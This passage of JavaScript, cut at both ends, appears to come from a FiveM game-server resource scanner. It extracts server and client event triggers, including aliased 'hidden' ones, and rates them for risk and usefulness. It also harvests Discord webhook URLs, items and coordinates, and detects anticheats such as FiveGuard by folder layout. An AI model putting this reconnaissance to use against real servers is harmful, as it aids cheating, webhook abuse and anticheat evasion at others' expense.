        const notificationInterval = totalFiles > 2000 ? 1000 : 500;
        window.deepScanNotificationInterval = setInterval(() => {
            updateDeepScanNotification(processedFiles, totalFiles);
        }, notificationInterval);
        
        const triggers = [];
        const knownTriggers = [];
        const webhooks = [];
        const items = [];
        const coordinates = [];
        const anticheats = [];
        const itemImages = new Map(); // Store item images
        const imageLoadPromises = []; // Track image loading promises
        const anticheatResults = new Map(); // Store anticheat results with file info
        const folderStructure = new Map(); // Store folder structure for anticheat detection




        const BATCH_SIZE = totalFiles > 10000 ? 1 : totalFiles > 5000 ? 5 : totalFiles > 2000 ? 10 : totalFiles > 1000 ? 15 : totalFiles > 500 ? 20 : 10;
        const BATCH_DELAY = totalFiles > 10000 ? 50 : totalFiles > 5000 ? 20 : totalFiles > 2000 ? 15 : totalFiles > 1000 ? 10 : totalFiles > 500 ? 5 : 10; // ms delay between batches
        const MAX_FILE_SIZE = 1 * 1024 * 1024; // 1MB limit per file (reduced from 2MB)
        const MAX_CONTENT_SIZE = totalFiles > 10000 ? 200000 : 500000; // Limit content scanning size
        let fileIndex = 0;
        let activeReaders = 0;
        const MAX_CONCURRENT_READERS = totalFiles > 10000 ? 1 : totalFiles > 5000 ? 2 : totalFiles > 2000 ? 3 : 3; // Reduce concurrent readers for very large dirs
        
        function processNextBatch() {

            if (totalFiles > 10000 && fileIndex > 0 && fileIndex % 100 === 0) {

                setTimeout(() => {
                    processNextBatchInternal();
                }, 0);
                return;
            }
            processNextBatchInternal();
        }
        
        function processNextBatchInternal() {

            if (activeReaders >= MAX_CONCURRENT_READERS) {
                setTimeout(processNextBatch, BATCH_DELAY);
                return;
            }
            
            const batch = files.slice(fileIndex, fileIndex + BATCH_SIZE);
            if (batch.length === 0) return;
            
            let batchProcessed = 0;
            
            batch.forEach(file => {
                try {
                    const fileName = file.webkitRelativePath || `web_upload/${file.name}`;

                    if (!isTextFile(fileName)) {

                        if (isImageFile(fileName) && totalFiles < 5000) {
                            const imagePromise = processImageFile(file, itemImages);
                            if (imagePromise) {
                                imageLoadPromises.push(imagePromise);
                            }
                        }
                        processedFiles++;
                        batchProcessed++;
                        if (processedFiles === totalFiles && !scanFinished) {
                            finishScanIfReady();
                        }
                        return;
                    }

                    if (totalFiles > 10000) {
                        const lowerName = fileName.toLowerCase();

                        if (lowerName.includes('node_modules/') || 
                            lowerName.includes('/dist/') || 
                            lowerName.includes('/build/') ||
                            lowerName.includes('.min.') ||
                            lowerName.includes('.bundle.') ||
                            lowerName.endsWith('.map') ||
                            lowerName.includes('/cache/')) {
                            processedFiles++;
                            batchProcessed++;
                            if (processedFiles === totalFiles && !scanFinished) {
                                finishScanIfReady();
                            }
                            return;
                        }
                    }

                    if (file.size > MAX_FILE_SIZE) {
                        processedFiles++;
                        batchProcessed++;
                        if (processedFiles === totalFiles && !scanFinished) {
                            finishScanIfReady();
                        }
                        return;
                    }
                    
                    activeReaders++;
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        activeReaders--;
                        batchProcessed++;
                        try {
                            const content = e.target.result;

                            if (content && content.length > 0) {

                                const contentToScan = content.length > MAX_CONTENT_SIZE ? content.substring(0, MAX_CONTENT_SIZE) : content;

                                if (totalFiles < 5000) {
                                    const pathParts = fileName.split('/');
                                    for (let j = 0; j < pathParts.length - 1; j++) {
                                        const folderBaseName = pathParts[j];
                                        if (j === 0 && isServerDirectory(folderBaseName)) {
                                            continue;
                                        }
                                        if (!folderStructure.has(folderBaseName)) {
                                            folderStructure.set(folderBaseName, []);
                                        }
                                        folderStructure.get(folderBaseName).push(fileName);
                                    }
                                }

                                if (totalFiles > 10000) {
                                    const fileTriggers = scanFileForTriggers(contentToScan, fileName);
                                    if (fileTriggers.length > 0) {
                                        triggers.push(...fileTriggers);
                                        const fileKnownTriggers = fileTriggers.filter(t => t.aiAnalysis && t.aiAnalysis.category === 'Known');
                                        if (fileKnownTriggers.length > 0) {
                                            knownTriggers.push(...fileKnownTriggers);
                                        }
                                    }
                                    const fileWebhooks = scanFileForWebhooks(contentToScan, fileName);
                                    if (fileWebhooks.length > 0) {
                                        webhooks.push(...fileWebhooks);
                                    }
                                } else {

                                    const fileTriggers = scanFileForTriggers(contentToScan, fileName);
                                    if (fileTriggers.length > 0) {
                                        triggers.push(...fileTriggers);
                                        const fileKnownTriggers = fileTriggers.filter(t => t.aiAnalysis && t.aiAnalysis.category === 'Known');
                                        if (fileKnownTriggers.length > 0) {
                                            knownTriggers.push(...fileKnownTriggers);
                                        }
                                    }
                                    const fileWebhooks = scanFileForWebhooks(contentToScan, fileName);
                                    if (fileWebhooks.length > 0) {
                                        webhooks.push(...fileWebhooks);
                                    }
                                    const fileItems = scanFileForItems(contentToScan, fileName);
                                    if (fileItems.length > 0) {
                                        items.push(...fileItems);
                                    }
                                    const fileCoordinates = scanFileForCoordinates(contentToScan, fileName);
                                    if (fileCoordinates.length > 0) {
                                        coordinates.push(...fileCoordinates);
                                    }
                                }
                            }
                            
                            processedFiles++;

                            const cleanupInterval = totalFiles > 10000 ? 50 : totalFiles > 5000 ? 100 : 200;
                            if (processedFiles % cleanupInterval === 0) {

                                if (window.gc) {
                                    window.gc();
                                }

                                if (totalFiles > 5000) {
                                    setTimeout(() => {}, 0);
                                }
                            }
                            
                            if (processedFiles === totalFiles && !scanFinished) {
                                finishScanIfReady();
                            }
                        } catch (error) {
                            console.error('Error processing file content:', error, fileName);
                            processedFiles++;
                            if (processedFiles === totalFiles && !scanFinished) {
                                finishScanIfReady();
                            }
                        }
                    };
                    
                    reader.onerror = function() {
                        activeReaders--;
                        batchProcessed++;
                        processedFiles++;
                        if (processedFiles === totalFiles && !scanFinished) {
                            finishScanIfReady();
                        }
                    };
                    
                    reader.readAsText(file);
                } catch (error) {
                    console.error('Error setting up file reader:', error);
                    processedFiles++;
                    batchProcessed++;
                    if (processedFiles === totalFiles && !scanFinished) {
                        finishScanIfReady();
                    }
                }
            });
            
            fileIndex += BATCH_SIZE;

            if (fileIndex < files.length) {

                if (totalFiles > 10000) {
                    const channel = new MessageChannel();
                    channel.port2.onmessage = () => {
                        processNextBatch();
                    };
                    setTimeout(() => {
                        channel.port1.postMessage(null);
                    }, BATCH_DELAY);
                } else if (window.requestIdleCallback) {
                    window.requestIdleCallback(() => {
                        processNextBatch();
                    }, { timeout: BATCH_DELAY });
                } else {
                    setTimeout(processNextBatch, BATCH_DELAY);
                }
            }
        }

        function finishScanIfReady() {
            if (scanFinished) return;
            scanFinished = true;

            let checkCount = 0;
            const checkReaders = setInterval(() => {
                checkCount++;
                if (activeReaders === 0 || checkCount > 300) { // Max 30 seconds
                    clearInterval(checkReaders);

                    const processResults = () => {
                        Promise.all(imageLoadPromises.slice(0, 100)).then(() => {

                            if (imageLoadPromises.length > 100) {
                                Promise.all(imageLoadPromises.slice(100)).then(() => {
                                    finalizeResults();
                                }).catch(() => finalizeResults());
                            } else {
                                finalizeResults();
                            }
                        }).catch(() => finalizeResults());
                    };
                    
                    const finalizeResults = () => {
                        detectAnticheatsByStructure(folderStructure, anticheatResults, anticheats);
                        const uniqueTriggers = removeDuplicateTriggers(triggers);
                        const uniqueKnownTriggers = removeDuplicateTriggers(knownTriggers);
                        const uniqueWebhooks = removeDuplicateWebhooks(webhooks);
                        const uniqueItems = removeDuplicateItems(items);
                        const uniqueCoordinates = removeDuplicateCoordinates(coordinates);
                        const itemsWithImages = attachImagesToItems(uniqueItems, itemImages);
                        finishScan(uniqueTriggers, uniqueKnownTriggers, uniqueWebhooks, itemsWithImages, uniqueCoordinates, anticheatResults, totalFiles);
                    };
                    
                    processResults();
                }
            }, 100);

            setTimeout(() => {
                clearInterval(checkReaders);
                if (!scanFinished) {
                    console.warn('Scan timeout - finishing with partial results');
                    detectAnticheatsByStructure(folderStructure, anticheatResults, anticheats);
                    const uniqueTriggers = removeDuplicateTriggers(triggers);
                    const uniqueKnownTriggers = removeDuplicateTriggers(knownTriggers);
                    const uniqueWebhooks = removeDuplicateWebhooks(webhooks);
                    const uniqueItems = removeDuplicateItems(items);
                    const uniqueCoordinates = removeDuplicateCoordinates(coordinates);
                    const itemsWithImages = attachImagesToItems(uniqueItems, itemImages);
                    finishScan(uniqueTriggers, uniqueKnownTriggers, uniqueWebhooks, itemsWithImages, uniqueCoordinates, anticheatResults, totalFiles);
                }
            }, 60000);
        }

        processNextBatch();
    } catch (error) {
        console.error('Error in scanAllFiles:', error);

        if (window.deepScanNotificationInterval) {
            clearInterval(window.deepScanNotificationInterval);
            window.deepScanNotificationInterval = null;
        }

        removeDeepScanNotification();
        showNotification('Error during scan', 'error');
    }
}

function isTextFile(fileName) {
    const textExtensions = ['.lua', '.js', '.json', '.cfg', '.txt', '.xml', '.html', '.css', '.php', '.py', '.md'];
    const extension = fileName.toLowerCase().substring(fileName.lastIndexOf('.'));
    return textExtensions.includes(extension);
}


function isImageFile(fileName) {
    const imageExtensions = ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.svg'];
    const extension = fileName.toLowerCase().substring(fileName.lastIndexOf('.'));
    return imageExtensions.includes(extension);
}

let finishScanCalled = false;

function finishScan(uniqueTriggers, uniqueKnownTriggers, uniqueWebhooks, itemsWithImages, uniqueCoordinates, anticheatResults, totalFiles) {
    if (finishScanCalled) {
        return;
    }
    finishScanCalled = true;

    if (window.deepScanNotificationInterval) {
        clearInterval(window.deepScanNotificationInterval);
        window.deepScanNotificationInterval = null;
    }

    removeDeepScanNotification();
    
    try {
        appState.scanResults.triggers = uniqueTriggers;
        appState.scanResults.knownTriggers = uniqueKnownTriggers;
        appState.scanResults.webhooks = uniqueWebhooks;
        appState.scanResults.items = itemsWithImages;
        appState.scanResults.coordinates = uniqueCoordinates;
        appState.scanResults.files = totalFiles;
        appState.scanResults.anticheats = Array.from(anticheatResults.values());

        const triggerFilters = document.getElementById('trigger-filters');
        if (triggerFilters && appState.currentTab === 'triggers') {
            triggerFilters.style.display = 'flex';
        }

        const itemsFilters = document.getElementById('item-filters');
        if (itemsFilters && appState.currentTab === 'items') {
            itemsFilters.style.display = 'flex';
        }

        applyTriggerFilter();

        if (appState.currentTab === 'items') {
            applyItemFilter();
        }
        updateWebhooksTable(uniqueWebhooks);
        updateSelectedWebhooksList();
        updateItemsTable(itemsWithImages);
        updateCoordinatesTable(uniqueCoordinates);
        updateKnownTriggersTable(uniqueKnownTriggers);
        updateAnticheatFromScan(appState.scanResults.anticheats);
        updateStats();

        updateResourceExplorerWithAnticheats();
        
        showNotification(`Deep scan completed! Found ${uniqueTriggers.length} triggers, ${uniqueWebhooks.length} webhooks, ${itemsWithImages.length} items, ${uniqueCoordinates.length} coordinates`, 'success');
    } catch (error) {
        console.error('Error finishing scan:', error);
    }
}

function processImageFile(file, itemImages) {
    try {
        const fileName = file.webkitRelativePath || `web_upload/${file.name}`;
        const fileNameLower = fileName.toLowerCase();

        const normalizedPath = fileNameLower.replace(/\\/g, '/');


        const imageDirs = ['images', 'image', 'img', 'icons', 'icon', 'items'];

        const isImageDir = imageDirs.some(dir => {

            return normalizedPath.includes(`/${dir}/`) || 
                   normalizedPath.endsWith(`/${dir}`) ||
                   normalizedPath.split('/').includes(dir);
        });

        const isInventoryImage = (normalizedPath.includes('inventory') || normalizedPath.includes('items')) && 
                                 (normalizedPath.includes('images') || normalizedPath.includes('image') || normalizedPath.includes('img'));

        if (isImageDir || isInventoryImage) {
            const pathParts = fileName.split(/[/\\]/);
            const imageName = pathParts[pathParts.length - 1]; // Get the filename
            const itemName = imageName.substring(0, imageName.lastIndexOf('.')); // Remove extension
            
            if (!itemName) return null; // Skip if no valid item name

            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = function(e) {
                    try {
                        const blob = new Blob([e.target.result], { type: file.type });
                        const imageUrl = URL.createObjectURL(blob);

                        itemImages.set(itemName.toLowerCase(), imageUrl);
                        resolve();
                    } catch (error) {
                        console.error('Error creating blob URL for image:', error);
                        reject(error);
                    }
                };
                reader.onerror = function() {
                    reject(new Error('Failed to read image file'));
                };
                reader.readAsArrayBuffer(file);
            });
        }
        return null; // Not an inventory image
    } catch (error) {
        console.error('Error processing image file:', error);
        return Promise.reject(error);
    }
}

function getResourceName(fileName, content) {
    try {
        const pathParts = fileName.split('/');
        const folderName = pathParts[0];

        if (fileName.includes('fxmanifest.lua') || fileName.includes('__resource.lua')) {

            if (content.includes('fx_version') || content.includes('resource_manifest_version')) {

                const resourceNameMatch = content.match(/--\s*Resource:\s*([^\n]+)/i) ||
                                        content.match(/resource_name\s*=\s*["']([^"']+)["']/i) ||
                                        content.match(/name\s*=\s*["']([^"']+)["']/i);
                
                if (resourceNameMatch) {
                    return resourceNameMatch[1].trim();
                }
            }
        }

        if (fileName.includes('items.lua') || fileName.includes('weapons.lua')) {

            const pathSegments = fileName.split('/');
            if (pathSegments.length >= 2) {
                return pathSegments[0]; // Return the resource folder name
            }
        }


        const pathSegments = fileName.split('/');
        if (pathSegments.length >= 2) {


            return pathSegments[1];
        }

        return folderName;
    } catch (error) {
        console.error('Error getting resource name:', error);
        return fileName.split('/')[0];
    }
}

function getResourceNameFromPath(fileName) {
    try {

        const pathParts = fileName.split('/');
        if (pathParts.length >= 2) {
            return pathParts[pathParts.length - 2]; // Resource name is the folder containing the file
        }
        return null;
    } catch (error) {
        console.error('Error getting resource name from path:', error);
        return null;
    }
}

function getFolderPathFromFileName(fileName) {
    try {

        const pathParts = fileName.split('/');
        if (pathParts.length >= 2) {

            return pathParts.slice(0, -1).join('/');
        }
        return fileName.substring(0, fileName.lastIndexOf('/')) || 'Root';
    } catch (error) {
        console.error('Error getting folder path from file name:', error);
        return 'Unknown';
    }
}

function scanFileForTriggers(content, fileName) {
    try {
        const triggers = [];
        const resourceName = getResourceName(fileName, content);

        const lines = content.split('\n');


        const hiddenTriggerVars = new Map(); // varName -> { type: 'server'|'client'|'general', line: number }
        const varAssignmentPatterns = [
            { pattern: /(?:local\s+)?(\w+)\s*=\s*TriggerServerEvent/g, type: 'server' },
            { pattern: /(?:local\s+)?(\w+)\s*=\s*TriggerClientEvent/g, type: 'client' },
            { pattern: /(?:local\s+)?(\w+)\s*=\s*TriggerEvent/g, type: 'general' }
        ];
        
        varAssignmentPatterns.forEach(({ pattern, type }) => {
            let match;
            pattern.lastIndex = 0;
            while ((match = pattern.exec(content)) !== null) {
                const varName = match[1];
                const lineNumber = getLineNumber(content, match.index);
                const fullLine = lines[lineNumber - 1] || '';
                const trimmedLine = fullLine.trim();

                if (trimmedLine.startsWith('--')) continue;

                let charCount = 0;
                for (let i = 0; i < lineNumber - 1; i++) {
                    charCount += lines[i].length + 1;
                }
                const matchPositionInLine = match.index - charCount;
                const lineBeforeMatch = fullLine.substring(0, matchPositionInLine);
                if (lineBeforeMatch.includes('--')) continue;
                
                hiddenTriggerVars.set(varName, { type: type, line: lineNumber });
            }
        });


        const triggerPatterns = [
            { pattern: /TriggerServerEvent\s*\(\s*["']([^"']+)["']/g, type: 'server' },
            { pattern: /TriggerClientEvent\s*\(\s*["']([^"']+)["']/g, type: 'client' },
            { pattern: /TriggerEvent\s*\(\s*["']([^"']+)["']/g, type: 'general' },
            { pattern: /lib\.callback\.await\s*\(\s*["']([^"']+)["']/g, type: 'ox_callback_client' },
            { pattern: /lib\.callback\.register\s*\(\s*["']([^"']+)["']/g, type: 'ox_callback_server' }
        ];


        hiddenTriggerVars.forEach((varInfo, varName) => {

            const hiddenPattern = new RegExp(`\\b${varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\s*\\(\\s*["']([^"']+)["']`, 'g');
            triggerPatterns.push({ pattern: hiddenPattern, type: varInfo.type, isHidden: true, varName: varName });
        });
        
        triggerPatterns.forEach(({ pattern, type, isHidden, varName }) => {
            let match;

            pattern.lastIndex = 0;
            while ((match = pattern.exec(content)) !== null) {
                try {
                    const triggerName = match[1];
                    const lineNumber = getLineNumber(content, match.index);
                    const fullLine = lines[lineNumber - 1] || match[0];

                    const trimmedLine = fullLine.trim();
                    if (trimmedLine.startsWith('--')) {
                        continue;
                    }


                    let charCount = 0;
                    for (let i = 0; i < lineNumber - 1; i++) {
                        charCount += lines[i].length + 1; // +1 for newline
                    }
                    const matchPositionInLine = match.index - charCount;
                    const lineBeforeMatch = fullLine.substring(0, matchPositionInLine);
                    if (lineBeforeMatch.includes('--')) {
                        continue;
                    }

                    let triggerCall = '';
                    
                    if (isHidden && varName) {

                        const varNameIndex = fullLine.indexOf(varName, matchPositionInLine);
                        if (varNameIndex !== -1) {

                            let triggerEnd = fullLine.length;
                            const commentPos = fullLine.indexOf('--', varNameIndex);
                            if (commentPos !== -1 && commentPos > varNameIndex) {
                                triggerEnd = commentPos;
                            }
                            
                            let extractedCall = fullLine.substring(varNameIndex, triggerEnd).trim();

                            let parenCount = 0;
                            let completeCall = '';
                            let foundFirstParen = false;
                            
                            for (let i = 0; i < extractedCall.length; i++) {
                                const char = extractedCall[i];
                                if (char === '(') {
                                    parenCount++;
                                    foundFirstParen = true;
                                } else if (char === ')') {
                                    parenCount--;
                                }
                                completeCall += char;

                                if (foundFirstParen && parenCount === 0) {
                                    triggerCall = completeCall.trim();
                                    break;
                                }
                            }

                            if (!triggerCall) {
                                triggerCall = extractedCall.trim();
                            }
                        } else {

                            triggerCall = match[0].trim();
                        }
                    } else if (type === 'ox_callback_client' || type === 'ox_callback_server') {
                        const callbackPattern = /lib\.callback\.(?:await|register)/;
                        const callbackMatch = fullLine.match(callbackPattern);
                        
                        if (callbackMatch && callbackMatch.index !== undefined) {
                            const callbackStartIndex = callbackMatch.index;
                            
                            let callbackEnd = fullLine.length;
                            const commentPos = fullLine.indexOf('--', callbackStartIndex);
                            if (commentPos !== -1 && commentPos > callbackStartIndex) {
                                callbackEnd = commentPos;
                            }
                            
                            let extractedCall = fullLine.substring(callbackStartIndex, callbackEnd).trim();
                            
                            let parenCount = 0;
                            let completeCall = '';
                            let foundFirstParen = false;
                            
                            for (let i = 0; i < extractedCall.length; i++) {
                                const char = extractedCall[i];
                                if (char === '(') {
                                    parenCount++;
                                    foundFirstParen = true;
                                } else if (char === ')') {
                                    parenCount--;
                                }
                                completeCall += char;
                                
                                if (foundFirstParen && parenCount === 0) {
                                    triggerCall = completeCall.trim();
                                    break;
                                }
                            }
                            
                            if (!triggerCall) {
                                triggerCall = extractedCall.trim();
                            }
                        } else {
                            triggerCall = match[0].trim();
                        }
                    } else {
                        const triggerFunctionPattern = /Trigger(?:Server|Client)?Event/;
                        const triggerFunctionMatch = fullLine.match(triggerFunctionPattern);
                        
                        if (triggerFunctionMatch && triggerFunctionMatch.index !== undefined) {
                            const triggerStartIndex = triggerFunctionMatch.index;

                            let triggerEnd = fullLine.length;
                            const commentPos = fullLine.indexOf('--', triggerStartIndex);
                            if (commentPos !== -1 && commentPos > triggerStartIndex) {
                                triggerEnd = commentPos;
                            }
                            
                            let extractedCall = fullLine.substring(triggerStartIndex, triggerEnd).trim();

                            let parenCount = 0;
                            let completeCall = '';
                            let foundFirstParen = false;
                            
                            for (let i = 0; i < extractedCall.length; i++) {
                                const char = extractedCall[i];
                                if (char === '(') {
                                    parenCount++;
                                    foundFirstParen = true;
                                } else if (char === ')') {
                                    parenCount--;
                                }
                                completeCall += char;

                                if (foundFirstParen && parenCount === 0) {
                                    triggerCall = completeCall.trim();
                                    break;
                                }
                            }

                            if (!triggerCall) {
                                triggerCall = extractedCall.trim();
                            }
                        } else {

                            triggerCall = match[0].trim();
                        }
                    }



                    let aiAnalysis = {
                        risk: 'Low',
                        category: 'Unknown',
                        useful: false,
                        description: '',
                        confidence: 0
                    };
                    
                    aiAnalysis = analyzeTriggerWithAISync(triggerName, triggerCall, content, lineNumber, fileName);

                    const triggerNameLower = triggerName.toLowerCase().trim();
                    let isKnown = false;
                    if (appState.knownTriggers && appState.knownTriggers.size > 0) {
                        for (const knownTrigger of appState.knownTriggers) {
                            if (knownTrigger && knownTrigger.toLowerCase().trim() === triggerNameLower) {
                                isKnown = true;
                                console.log(`[Known Trigger Match] Found: "${triggerName}" matches "${knownTrigger}"`);
                                break;
                            }
                        }
                    }
                    if (isKnown) {
                        aiAnalysis.category = 'Known';
                    }

                    if (isHidden && varName) {

                        const triggerFunctionMap = {
                            'server': 'TriggerServerEvent',
                            'client': 'TriggerClientEvent',
                            'general': 'TriggerEvent'
                        };
                        const fullFunctionName = triggerFunctionMap[type] || 'TriggerServerEvent';

                        triggerCall = triggerCall.replace(new RegExp(`\\b${varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\s*\\(`), `${fullFunctionName}(`);
                    }
                    
                    triggers.push({
                        resource: resourceName,
                        usage: triggerCall,
                        risk: aiAnalysis.risk,
                        file: fileName, // fileName is already the full path from scanFileForTriggers
                        line: lineNumber,
                        triggerName: triggerName,
                        triggerType: type, // Add type field
                        aiAnalysis: aiAnalysis,
                        isHidden: isHidden || false // Mark if detected via hidden variable
                    });
                } catch (error) {
                    console.error('Error processing trigger match:', error);
                }
            }
        });
        
        return triggers;
    } catch (error) {
        console.error('Error scanning file for triggers:', error);
        return [];
    }
}

function scanFileForWebhooks(content, fileName) {
    try {
        const webhooks = [];
        const resourceName = getResourceName(fileName, content);
        
        const webhookPatterns = [
            /https:\/\/discord\.com\/api\/webhooks\/[^\s"']+/g,
            /https:\/\/discordapp\.com\/api\/webhooks\/[^\s"']+/g,
            /webhook.*=.*["'](https:\/\/[^"']+)["']/g,
            /["'](https:\/\/discord\.com\/api\/webhooks\/[^"']+)["']/g
        ];
        
        webhookPatterns.forEach(pattern => {
            let match;
            while ((match = pattern.exec(content)) !== null) {
                try {
                    const webhookUrl = match[1] || match[0];
                    const lineNumber = getLineNumber(content, match.index);
                    
                    webhooks.push({
                        resource: resourceName,
                        url: webhookUrl,
                        status: 'Active',
                        file: fileName,
                        line: lineNumber
                    });
                } catch (error) {
                    console.error('Error processing webhook match:', error);
                }
            }
        });
        
        return webhooks;
    } catch (error) {
        console.error('Error scanning file for webhooks:', error);
        return [];
    }
}

function scanFileForItems(content, fileName) {
    try {
        const items = [];
        const resourceName = getResourceName(fileName, content);

        if (fileName.includes('items.lua') || fileName.includes('weapons.lua')) {
            const lines = content.split('\n');
            let currentItem = null;
            let braceCount = 0;
            
            for (let i = 0; i < lines.length; i++) {
                try {
                    const line = lines[i];

                    const itemMatch = line.match(/\[["']([^"']+)["']\]\s*=\s*{/);
                    if (itemMatch) {
                        const itemName = itemMatch[1];

                        const itemCategory = itemName.toLowerCase().startsWith('weapon_') ? 'weapon' : 'item';
                        
                        currentItem = {
                            name: itemName,
                            label: '',
                            type: itemCategory,
                            weight: 0,
                            file: fileName,
                            line: i + 1,
                            resource: resourceName
                        };
                        braceCount = 1;
                        continue;
                    }

                    if (currentItem) {
                        const labelMatch = line.match(/label\s*=\s*["']([^"']+)["']/);
                        if (labelMatch) {
                            currentItem.label = labelMatch[1];
                        }

                        const weightMatch = line.match(/weight\s*=\s*([0-9.]+)/);
                        if (weightMatch) {
                            currentItem.weight = parseFloat(weightMatch[1]);
                        }

                        const openBraces = (line.match(/{/g) || []).length;
                        const closeBraces = (line.match(/}/g) || []).length;
                        braceCount += openBraces - closeBraces;

                        if (braceCount <= 0 && currentItem.name && currentItem.label) {
                            items.push(currentItem);
                            currentItem = null;
                            braceCount = 0;
                        }
                    }
                } catch (error) {
                    console.error('Error processing line:', error);
                }
            }

            const simpleItemPattern = /\[["']([^"']+)["']\]\s*=\s*["']([^"']+)["']/g;
            let simpleMatch;
            while ((simpleMatch = simpleItemPattern.exec(content)) !== null) {
                const itemName = simpleMatch[1];
                const itemLabel = simpleMatch[2];
                const lineNumber = getLineNumber(content, simpleMatch.index);

                const existingItem = items.find(item => item.name === itemName);
                if (!existingItem) {

                    const itemCategory = itemName.toLowerCase().startsWith('weapon_') ? 'weapon' : 'item';
                    
                    items.push({
                        name: itemName,
                        label: itemLabel,
                        type: itemCategory,
                        weight: 0,
                        file: fileName,
                        line: lineNumber,
                        resource: resourceName
                    });
                }
            }
        }
        
        return items;
    } catch (error) {
        console.error('Error scanning file for items:', error);
        return [];
    }
}

function scanFileForCoordinates(content, fileName) {
    try {
        const coordinates = [];
        const resourceName = getResourceName(fileName, content);

        const findNextToItems = document.getElementById('find-next-to-items-checkbox')?.checked || false;
        const findVec3 = document.getElementById('find-vec3-checkbox')?.checked || true;
        const findVec4 = document.getElementById('find-vec4-checkbox')?.checked || true;

        const itemsInFile = scanFileForItems(content, fileName);
        const itemNames = itemsInFile.map(item => item.name.toLowerCase());
        
        const lines = content.split('\n');
        
        for (let i = 0; i < lines.length; i++) {
            try {
                const line = lines[i];

                if (findVec3) {

                    const vec3Patterns = [
                        /vec3\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g,
                        /vector3\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g,
                        /Vector3\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g
                    ];
                    
                    vec3Patterns.forEach(pattern => {
                        let match;
                        while ((match = pattern.exec(line)) !== null) {
                            const x = parseFloat(match[1]);
                            const y = parseFloat(match[2]);
                            const z = parseFloat(match[3]);

                            let nearItem = null;
                            if (findNextToItems) {

                                const contextStart = Math.max(0, i - 10);
                                const contextEnd = Math.min(lines.length, i + 10);
                                const context = lines.slice(contextStart, contextEnd).join(' ').toLowerCase();
                                
                                for (const itemName of itemNames) {
                                    if (context.includes(itemName)) {
                                        nearItem = itemName;
                                        break;
                                    }
                                }
                            }
                            
                            coordinates.push({
                                type: 'vec3',
                                x: x,
                                y: y,
                                z: z,
                                w: null,
                                coordinates: `vec3(${x}, ${y}, ${z})`,
                                resource: resourceName,
                                file: fileName,
                                line: i + 1,
                                nearItem: nearItem,
                                fullLine: line.trim()
                            });
                        }
                    });
                }

                if (findVec4) {

                    const vec4Patterns = [
                        /vec4\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g,
                        /vector4\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g,
                        /Vector4\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g
                    ];
                    
                    vec4Patterns.forEach(pattern => {
                        let match;
                        while ((match = pattern.exec(line)) !== null) {
                            const x = parseFloat(match[1]);
                            const y = parseFloat(match[2]);
                            const z = parseFloat(match[3]);
                            const w = parseFloat(match[4]);

                            let nearItem = null;
                            if (findNextToItems) {

                                const contextStart = Math.max(0, i - 10);
                                const contextEnd = Math.min(lines.length, i + 10);
                                const context = lines.slice(contextStart, contextEnd).join(' ').toLowerCase();
                                
                                for (const itemName of itemNames) {
                                    if (context.includes(itemName)) {
                                        nearItem = itemName;
                                        break;
                                    }
                                }
                            }
                            
                            coordinates.push({
                                type: 'vec4',
                                x: x,
                                y: y,
                                z: z,
                                w: w,
                                coordinates: `vec4(${x}, ${y}, ${z}, ${w})`,
                                resource: resourceName,
                                file: fileName,
                                line: i + 1,
                                nearItem: nearItem,
                                fullLine: line.trim()
                            });
                        }
                    });
                }

                const coordArrayPatterns = [
                    /\[\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\]/g,
                    /{\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*}/g
                ];
                
                coordArrayPatterns.forEach(pattern => {
                    let match;
                    while ((match = pattern.exec(line)) !== null) {
                        const x = parseFloat(match[1]);
                        const y = parseFloat(match[2]);
                        const z = parseFloat(match[3]);

                        let nearItem = null;
                        if (findNextToItems) {

                            const contextStart = Math.max(0, i - 10);
                            const contextEnd = Math.min(lines.length, i + 10);
                            const context = lines.slice(contextStart, contextEnd).join(' ').toLowerCase();
                            
                            for (const itemName of itemNames) {
                                if (context.includes(itemName)) {
                                    nearItem = itemName;
                                    break;
                                }
                            }
                        }
                        
                        coordinates.push({
                            type: 'array',
                            x: x,
                            y: y,
                            z: z,
                            w: null,
                            coordinates: `[${x}, ${y}, ${z}]`,
                            resource: resourceName,
                            file: fileName,
                            line: i + 1,
                            nearItem: nearItem,
                            fullLine: line.trim()
                        });
                    }
                });
                
            } catch (error) {
                console.error('Error processing coordinate line:', error);
            }
        }
        
        return coordinates;
    } catch (error) {
        console.error('Error scanning file for coordinates:', error);
        return [];
    }
}

function getFolderNameFromPath(fileName) {
    try {
        const pathParts = fileName.split('/');
        if (pathParts.length >= 2) {
            return pathParts[0]; // First folder name
        }
        return null;
    } catch (error) {
        console.error('Error getting folder name from path:', error);
        return null;
    }
}

function detectAnticheatsByStructure(folderStructure, anticheatResults, anticheats) {
    try {


        const anticheatStructures = [
            {
                name: 'ElectronAC',
                requiredPaths: [
                    { path: 'src/client', type: 'folder', mustHaveFiles: true },
                    { path: 'src/include', type: 'folder', mustHaveFiles: true },
                    { path: 'web', type: 'folder', mustHaveFiles: true }
                ],
                minMatches: 3 // Must have all 3 folders
            },
            {
                name: 'FiveGuard',
                requiredPaths: [
                    { path: 'fxmanifest.lua', type: 'file' },
                    { path: 'index.html', type: 'file' },
                    { path: 'script-obfuscated.js', type: 'file' }
                ],
